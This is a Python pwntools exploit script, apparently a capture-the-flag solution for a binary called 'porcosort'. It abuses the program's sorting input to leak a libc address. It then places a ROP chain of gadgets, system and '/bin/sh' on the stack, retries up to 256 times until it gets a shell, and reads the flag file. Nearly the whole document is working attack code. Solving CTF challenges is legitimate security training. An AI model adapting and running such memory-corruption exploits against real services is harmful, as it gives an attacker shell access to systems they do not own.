#!/usr/bin/env python3
from pwn import *
import sys

exe = context.binary = ELF('porcosort')

host = args.HOST or 'HOST'
port = int(args.PORT or 4141)
if len(sys.argv) >= 3 and sys.argv[1] == "--connection-info":
    _, host, port = sys.argv[2].split()

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# tbreak *(vuln+300)
# continue
gdbscript = '''
tbreak *(vuln + 300)
continue
tele $rsp -l 64
'''.format(**locals())

# context.log_level = 0
# args.GDB = 1

for i in range(256):
    io = start()

    small = unpack(b"\0" * 7 + b"\x80", sign=True)
    io.sendafter(b"here.", pack(small + 0xa) * 6)
    io.recvuntil(b": ")
    libc = ELF("./libc.so")
    libc.address = int(io.recvline().strip(), 16) - libc.sym['_IO_2_1_stdout_']
    info(hex(libc.address))

    io.sendlineafter(b"? ", b"48")
    io.sendlineafter(b"> ", b"60") # How many to actually sort?

    poprax_ret = libc.address + 0x41770
    poprdi_callrax = libc.address + 0x111b11
    empty_ret = libc.address + 0x291d6
    binsh = next(libc.search(b"/bin/sh\0"))

    assert empty_ret < poprax_ret < libc.sym.system < poprdi_callrax < binsh < libc.sym._IO_2_1_stdout_

    custom = [empty_ret, poprax_ret, libc.sym.system, poprdi_callrax, binsh]
    # custom = []
    for _ in range(47 - len(custom)):
        io.sendlineafter(b"> ", str(small + 0xb).encode())
    for c in custom:
        io.sendlineafter(b"> ", str(c).encode())

    #io.interactive()
    io.sendline(b'id')
    x = io.recvline(timeout=0.5)
    print(x)
    if b'uid=' in x:
        break
    io.close()
else:
    raise Exception("Failed after 256 tries")

io.sendline(b'cat flag')
flag = io.recvline().strip().decode()
io.close()

print(flag)
